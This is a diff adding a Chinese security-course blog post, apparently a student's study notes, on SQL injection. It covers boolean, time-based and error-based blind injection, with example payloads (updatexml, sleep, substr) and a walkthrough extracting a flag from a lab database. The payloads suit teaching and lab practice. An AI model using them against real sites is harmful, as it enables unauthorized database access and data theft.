@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zhigao.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="第56天-SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错&amp;有无回显&amp;错误处理&amp;审计复盘">
+<meta property="og:url" content="http://zhigao.xyz/2026/07/30/%E7%AC%AC56%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5-%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6-%E5%B8%83%E5%B0%94-%E6%8A%A5%E9%94%99-%E6%9C%89%E6%97%A0%E5%9B%9E%E6%98%BE-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86-%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:site_name" content="Voyage Memo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhigao.xyz/images/056-1.png">
+<meta property="og:image" content="http://zhigao.xyz/images/056-2.png">
+<meta property="article:published_time" content="2026-07-30T00:37:03.000Z">
+<meta property="article:modified_time" content="2026-07-30T00:42:26.646Z">
+<meta property="article:author" content="智高">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhigao.xyz/images/056-1.png">
+
+<link rel="canonical" href="http://zhigao.xyz/2026/07/30/%E7%AC%AC56%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5-%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6-%E5%B8%83%E5%B0%94-%E6%8A%A5%E9%94%99-%E6%9C%89%E6%97%A0%E5%9B%9E%E6%98%BE-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86-%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第56天-SQL注入&增删改查&盲注&延时&布尔&报错&有无回显&错误处理&审计复盘 | Voyage Memo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Voyage Memo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zhigao.xyz/2026/07/30/%E7%AC%AC56%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5-%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6-%E5%B8%83%E5%B0%94-%E6%8A%A5%E9%94%99-%E6%9C%89%E6%97%A0%E5%9B%9E%E6%98%BE-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86-%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/photo.jpg">
+      <meta itemprop="name" content="智高">
+      <meta itemprop="description" content="正因为我有能力跨越，这个考验才会降临!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Voyage Memo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第56天-SQL注入&增删改查&盲注&延时&布尔&报错&有无回显&错误处理&审计复盘
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-07-30 08:37:03 / 修改时间：08:42:26" itemprop="dateCreated datePublished" datetime="2026-07-30T08:37:03+08:00">2026-07-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">小迪安全课程学习笔记(web攻防)</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><font></font></p>
+<span id="more"></span>
+
+
+
+
+
+<p><font style="background-color:#ffff00;"></font></p>
+<p><font style="background-color:#ffff00;">这节课其实是很简单的，整个过程会很费时间，我下面可能只会写大概过程，而且一般都是判断存在sql注入，我们就用sqlmap了。我之前手写过一份很全的笔记，等回学校上传</font></p>
+<p><font style="color:#ff0000;background-color:#ffff00;"></font></p>
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-SQL注入-布尔&amp;延时&amp;报错&amp;盲注</font></p>
+<p>在不能使用union联合注入的时候我们就考虑盲注，分为时间、布尔、报错注入，时间盲注是万能注入（前提是没waf和过滤sleep的前提下）。这些报错都是通过一些主要函数和辅助函数来实现注入的，</p>
+<p><font style="background-color:#ED740C;">#增删改查</font></p>
+<p>1、功能：数据查询</p>
+<p>查询：SELECT*FROM news where id&#x3D;$id</p>
+<p>2、功能：新增用户，添加新闻等</p>
+<p>增加：INSERTINTO news (字段名)VALUES(数据)</p>
+<p>3、功能：删除用户，删除新闻等</p>
+<p>删除：DELETEFROM news WHERE id&#x3D;$id</p>
+<p>4、功能：修改用户，修改文章等</p>
+<p>修改：UPDATE news SET id&#x3D;$id</p>
+<p><font style="background-color:#ED740C;">#布尔&amp;报错&amp;延迟</font></p>
+<p><font style="color:#000000;background-color:#FBDE28;">盲注就是在注入过程中，获取的数据不能回显至前端页面。</font></p>
+<p><font style="color:#000000;background-color:#FBDE28;">我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</font></p>
+<p>解决：常规的联合查询注入不行的情况</p>
+<p>我们可以知道盲注分为以下三类：</p>
+<p>1、基于布尔的SQL盲注-逻辑判断</p>
+<p><font style="background-color:#81BBF8;">ascii,left,ord,mid这些就是可能用到的函数</font></p>
+<p><font style="background-color:#81BBF8;">思路就是我们通过判断来先猜长度，然后猜名字（库、表、字段）</font></p>
+<p><font style="background-color:#81BBF8;">用select举例：select * from 表 where 字段&#x3D;’-1’ and length(database())&#x3D;x #判断数据库名长度</font></p>
+<p><font style="background-color:#81BBF8;">然后通过substr或者ord等函数来判断名字是什么，表字段也是一样</font></p>
+<p>and length(database())&#x3D;7;</p>
+<p>andleft(database(),1)&#x3D;’p’;</p>
+<p>andleft(database(),2)&#x3D;’pi’;</p>
+<p>and substr(database(),1,1)&#x3D;’p’;</p>
+<p>and substr(database(),2,1)&#x3D;’i’;</p>
+<p>and ord(left(database(),1))&#x3D;112;</p>
+<p>2、基于时间的SQL盲注-延时判断</p>
+<p><font style="background-color:#81BBF8;">if判断就是和编程语言一个含义</font></p>
+<p><font style="background-color:#81BBF8;">sleep(a,b,c)，a为条件，a成功返回b，反之返回c</font></p>
+<p><font style="background-color:#81BBF8;">这个也是一样只是这个是通过响应时间来判断的</font></p>
+<p>and sleep(1);</p>
+<p>and if(1&gt;2,sleep(1),0);</p>
+<p>and if(1&lt;2,sleep(1),0);</p>
+<p><font style="background-color:#81BBF8;"></font></p>
+<p>3、基于报错的SQL盲注-报错回显</p>
+<p>floor（已过时，高版本mysql限制）</p>
+<p><font style="background-color:#81BBF8;">updatexml</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">(</font><font style="background-color:#81BBF8;">xml文档</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">,</font><font style="background-color:#81BBF8;"> xpath路径</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">,</font><font style="background-color:#81BBF8;"> 替换后的新内容</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">)</font></p>
+<p><font style="background-color:#81BBF8;">extractvalue(xml文档,xpath路径）</font></p>
+<p><font style="background-color:#81BBF8;"></font></p>
+<p><font style="background-color:#81BBF8;"> updatexml</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">(1,</font><font style="background-color:#81BBF8;">concat</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">(0x7e,(select database()),0x7e),1)</font></p>
+<p><font style="background-color:#81BBF8;"> extractvalue</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">(1,</font><font style="background-color:#81BBF8;">concat</font><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">(0x7e,(select database()),0x7e))</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#81BBF8;">主要是第二个参数<del>内容</del>不合法导致的报错，报错的同时就把<del>中间的内容执行了，所以</del>写我们想查询相关信息的sql语句</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font></p>
+<p>参考：</p>
+<p>if(条件,5,0)  #条件成立 返回5 反之 返回0</p>
+<p>sleep(5)  #SQL语句延时执行5秒</p>
+<p>mid&#x3D;substr&#x3D;substring  #mid(a,b,c)#从位置b开始，截取a字符串的c位</p>
+<p>left(database(),1)，database()当前数据库  #left(a,b)从左侧截取a的前b位</p>
+<p>length(database())&#x3D;8  #判断数据库database()名的长度</p>
+<p>ord&#x3D;ascii ascii(x)&#x3D;97  #判断x的ascii码是否等于97</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/impulse-/p/14227189.html">https://www.cnblogs.com/impulse-/p/14227189.html</a></p>
+<p><font style="background-color:#ED740C;"></font></p>
+<p><font style="background-color:#ED740C;">#使用条件</font></p>
+<p><font style="background-color:#FBDE28;">基于延时：都不需要</font></p>
+<p>and if(1&#x3D;1,sleep(5),0)</p>
+<p><font style="background-color:#FBDE28;">基于布尔：有真假判断标准，比如返回页面不同，数据包长度等</font></p>
+<p>and length(database())&#x3D;6</p>
+<p><font style="background-color:#FBDE28;">基于报错：页面能返回报错信息</font></p>
+<p>and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</p>
+<blockquote>
+<h1 id="这里是我之前学sql注入打布尔盲注的笔记"><a href="#这里是我之前学sql注入打布尔盲注的笔记" class="headerlink" title="这里是我之前学sql注入打布尔盲注的笔记"></a>这里是我之前学sql注入打布尔盲注的笔记</h1><h2 id="布尔盲注一："><a href="#布尔盲注一：" class="headerlink" title="布尔盲注一："></a>布尔盲注一：</h2><p>什么是布尔盲注：</p>
+<p>当目标往回走哪满足一下情况是，就会用到布尔盲注</p>
+<p>1、执行查询后，页面不直接显示查询结果（没有回显位）</p>
+<p>2、但会根据SQL语句的真假，返回两种不同状态：</p>
+<p>条件为真——&gt;页面正常显示（比如返回”查询成功”）</p>
+<p>条件为假——&gt;页面异常&#x2F;显示错误&#x2F;返回空结果</p>
+<p>布尔盲注的核心，就是用mysql函数把数据拆成单个字符，在通过条件判断猜解</p>
+<p>常用mysql函数</p>
+<p>length（str）返回字符串的长度</p>
+<p>substr&#x2F;substring&#x2F;mid(str,pos,len)从字符串指定位置截取指定长度的子串，从1开始。</p>
+<p>ascii（str）返回字符串第一个字符的ascii码</p>
+<p>1、使用 1 and length(database())&#x3D;17结果正确可以知道数据库长度为17，使用bp会节省时间</p>
+<p>2、使用1 and substr(database(),1,1)&#x3D;’s’ 使用字典爆破，替换1和s，爆破模式一定要选cluster bomb（笛卡尔积爆破），得到数据库名sql_injection_lab，<font style="background-color:#ED740C;">这里犯了一个错，数据库名是不区分大小写的，我在字典中把字母大写小写全加进去了。</font></p>
+<p>3、判断表中内容是否存在，爆破表名、列名</p>
+<p>1 and(select count(*) from information_schema.tables where table_schema&#x3D;’sql_injection_lab’ and table_name&#x3D;’flag’)&#x3D;1</p>
+<p>count(*)是mysql 中的聚合函数，作用是统计行数</p>
+<p>结果是存在这个表</p>
+<p>1 and(select count(*) from information_schema.columns where table_schema&#x3D;’sql_injection_lab’ and table_name&#x3D;’flag’ and column_name&#x3D;’flag’)&#x3D;1</p>
+<p>结果是存在这个字段</p>
+<p>4、用bp来判断flag多长</p>
+<p>1 and length((select flag from sql_injection_lab.flag limit 1))&#x3D;1</p>
+<p>必须两个括号，要不然不会执行里面的语句</p>
+<p>limit 1 避免返回多行数据报错，强制返回第一条数据</p>
+<p>1 and substr((select flag from sql_injection_lab.flag limit 1),1,1 ))&#x3D;’f’</p>
+<p>5、爆破flag，还是使用bp1 and substr((select flag from sql_injection_lab.flag limit 1),1,1 )&#x3D;’f’替换f和1</p>
+<p>flag{dab67f7239}</p>
+<h2 id="布尔盲注二："><a href="#布尔盲注二：" class="headerlink" title="布尔盲注二："></a>布尔盲注二：</h2><p><font style="background-color:#FBDE28;">这里有个坑：</font></p>
+<p><font style="background-color:#FBDE28;">我们输入1显示正常，输入1 and 1&#x3D;1显示正常，输入1 and 1&#x3D;2还显示正常，这就很不正常了，说明我们后面的and ….根本就没被执行，为什么会出现这种情况呢，大概率是id传入的值被引号包裹了，数字执行还是数字，但是跟了and…就被识别成字符串了，mysql的特殊规则是，字符串和数字比较时，会把字符串转成数字，转换规则是：从字符串开头开始，一直读到给数字字符为止，后面的内容全部被丢弃</font></p>
+<p><font style="background-color:#FBDE28;"></font></p>
+<p>1、输入1为true，1’为false，1’ and 1&#x3D;1#为false，1’ and 1&#x3D;1–为false，就可以看出注释符不生效，所以我们需要手动闭合，输入1’’发现为true，这里为什么为true呢，因为 id&#x3D;’1’’’，第一个’是开始，后面连续两个’转义为一个’文本，第四个‘为结束。只有在字符串内部的两个单引号才会被转义</p>
+<p>空字符串’’等价于false，所以向要1 and 1&#x3D;2为false，就得1’ and 1&#x3D;2 or ‘这样写</p>
+<p>1’ and length(database())&#x3D;1 or ‘结合bp来判断数据库名长度为17</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/056-1.png"></p>
+<p>2、用bp intruder模块暴力破解数据库名字</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/056-2.png"></p>
+<p>把数据库名拼接一下：sql_injection_lab</p>
+<p>3、我猜测这个数据库下肯定有一个flag表，判断：</p>
+<p>1’ and (select count(*) from information_schema.tables where table_schema &#x3D; ‘sql_injection_lab’ and table_name&#x3D;’flag’)&#x3D;1 or ‘</p>
+<p>4、我猜测flag表里面肯定有一个flag字段：判断</p>
+<p>1’ and (select count(*) from information_schema.columns where column_name&#x3D;’flag’ and table_name&#x3D;’flag’)&#x3D;1 or ‘成功</p>
+<p>1’ and (select count(*) from information_schema.columns where column_name&#x3D;’flag’)&#x3D;1 or ‘失败，这个含义是这个数据库中所有表中的flag字段，他可能不止一个flag</p>
+<p>5、判断flag表中flag字段值的长度</p>
+<p>1’ and length((select flag from sql_injection_lab.flag limit 1))&#x3D;1 or’</p>
+<p>结果是38</p>
+<p>6、爆破flag</p>
+<p>1’ and substr((select flag from sql_injection_lab.flag limit 1),1,1)&#x3D;’f’ or ‘</p>
+<p>flag{24dd1d4e93f841daae53cf4ad34d7562}</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/07/30/%E7%AC%AC55%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5-HTTP%E5%A4%B4-UA-XFF-Referer-Cookie-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99-%E5%A4%8D%E7%9B%98/" rel="prev" title="第55天-SQL注入&增删改查&HTTP头&UA&XFF&Referer&Cookie&无回显报错&复盘">
+      <i class="fa fa-chevron-left"></i> 第55天-SQL注入&增删改查&HTTP头&UA&XFF&Referer&Cookie&无回显报错&复盘
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="w0aFeK3v2HV9LRG7Ubh6"></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+
+<livere-comment client-id="w0aFeK3v2HV9LRG7Ubh6"></livere-comment>
+<script type="module" src="https://www.livere.org/livere-widget.js"></script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E9%87%8C%E6%98%AF%E6%88%91%E4%B9%8B%E5%89%8D%E5%AD%A6sql%E6%B3%A8%E5%85%A5%E6%89%93%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">这里是我之前学sql注入打布尔盲注的笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%80%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">布尔盲注一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%BA%8C%EF%BC%9A"><span class="nav-number">1.2.</span> <span class="nav-text">布尔盲注二：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="智高"
+      src="/images/photo.jpg">
+  <p class="site-author-name" itemprop="name">智高</p>
+  <div class="site-description" itemprop="description">正因为我有能力跨越，这个考验才会降临!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Spider-px" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Spider-px" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">智高</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='0,0,0' opacity='0.7' zIndex='' count='90' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
